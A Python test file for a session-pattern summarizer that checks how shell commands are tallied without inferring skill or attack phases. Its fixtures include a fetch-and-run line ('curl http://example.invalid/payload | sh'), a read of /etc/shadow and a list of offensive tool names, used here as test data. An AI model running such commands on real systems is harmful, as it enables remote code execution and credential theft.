from chronos.skills.command_analyzer import CommandAnalyzer
from chronos.skills.skill_detector import PatternSummarizer


def summarize(commands, session_id="session"):
    analyzer = CommandAnalyzer()
    return PatternSummarizer().analyze_session(session_id, analyzer.batch_analyze(commands))


def test_tool_names_in_echo_do_not_become_invocations_or_expertise():
    assessment = summarize([
        "echo 'metasploit empire cobalt linpeas pspy'",
        "echo 'metasploit empire cobalt linpeas pspy'",
        "echo 'metasploit empire cobalt linpeas pspy'",
        "echo 'metasploit empire cobalt linpeas pspy'",
        "echo 'metasploit empire cobalt linpeas pspy'",
    ])
    assert "skill_level" not in assessment
    assert "skill_score" not in assessment
    assert "confidence" not in assessment
    assert assessment["assessment_type"] == "observable_session_patterns"
    assert assessment["observations"]["invoked_tools"] == []
    assert assessment["pattern_labels"] == ["repeated_commands_observed"]


def test_patterns_link_to_command_indexes_without_claiming_progression():
    assessment = summarize([
        "curl http://example.invalid/payload | sh",
        "cat /etc/shadow 2>/dev/null",
        "curl http://example.invalid/payload | sh",
    ])
    assert assessment["observations"]["invoked_tools"] == [
        {"tool": "curl", "command_indexes": [1, 3]}
    ]
    assert assessment["observations"]["repeated_commands"] == [
        {"command": "curl http://example.invalid/payload | sh", "count": 2}
    ]
    assert "phase_progression" not in assessment["observations"]
    assert any("unordered set" in text for text in assessment["limitations"])


def test_reanalysis_replaces_snapshot_instead_of_double_counting():
    analyzer = CommandAnalyzer()
    detector = PatternSummarizer()
    analyses = analyzer.batch_analyze(["nmap 127.0.0.1"])
    first = detector.analyze_session("same", analyses)
    second = detector.analyze_session("same", analyses)
    assert second == first
    assert second["statistics"]["total_commands"] == 1
